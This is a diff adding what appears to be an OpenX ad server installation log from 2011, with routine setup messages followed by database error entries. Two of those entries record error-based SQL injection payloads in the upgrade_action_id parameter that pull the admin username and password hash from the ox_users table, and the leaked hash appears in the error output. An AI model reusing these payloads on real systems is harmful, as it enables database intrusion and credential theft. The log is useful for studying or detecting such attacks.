@@ -1,0 +1,38 @@
+Installation started 2011-07-17 07:27:13
+Attempting to connect to database adslogta_ad with user adslogta_ad
+Connected to database adslogta_ad
+Database settings and permissions are OK
+creating upgrade_action audit table
+successfully created upgrade_action audit table
+creating database_action audit table
+successfully created database_action audit table
+schema definition from cache TRUE
+Installation created the core tables
+Installation updated the schema version to 613
+Installation updated the application version to 2.8.7
+Preparing to set timezone preference...
+Found timezone preference ID of 16
+Found the admin account's timezone association, updating preference...
+Updated the admin account timezone preference to: 'Asia/Damascus'
+#! (): Permissions error
+Starting file-check for plugins...
+Finished file-check for plugins
+Starting file-check for plugins...
+Finished file-check for plugins
+Starting file-check for plugins...
+Finished file-check for plugins
+#! omg it all went PEAR shaped! _doQuery: [Error message: Could not execute statement]
+[Last executed query: SELECT * FROM ox_database_action WHERE upgrade_action_id = 1 OR 1=(SELECT(COUNT(*)) FROM(SELECT(1)UNION(SELECT(2))UNION(SELECT(3)))x GROUP BY CONCAT(MID((SELECT(CONCAT(CHAR(124),CONCAT_WS(CHAR(58),username,password,count(username)),CHAR(124))) FROM(ox_users) LIMIT 0,1),1,63),FLOOR(RAND(0)*2)))# AND action =30 AND info2 IS NULL ORDER BY database_action_id DESC]
+[Native code: 1062]
+[Native message: Duplicate entry '|admin:d58dd3fa9fbbc5aca88e38124a7909bc:10|1' for key 1]
+
+#! omg it all went PEAR shaped! _doQuery: [Error message: Could not execute statement]
+[Last executed query: SELECT * FROM ox_database_action WHERE upgrade_action_id = ((SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID((SELECT concat_ws(0x3a,username,password) from ox_users where user_id=1),1,63), FLOOR(RAND(0)*2)))) --  AND action =30 AND info2 IS NULL ORDER BY database_action_id DESC]
+[Native code: 1062]
+[Native message: Duplicate entry 'admin:d58dd3fa9fbbc5aca88e38124a7909bc1' for key 1]
+
+#! omg it all went PEAR shaped! _doQuery: [Error message: Could not execute statement]
+[Last executed query: SELECT * FROM ox_database_action WHERE upgrade_action_id = x AND action =30 AND info2 IS NULL ORDER BY database_action_id DESC]
+[Native code: 1054]
+[Native message: Unknown column 'x' in 'where clause']
+
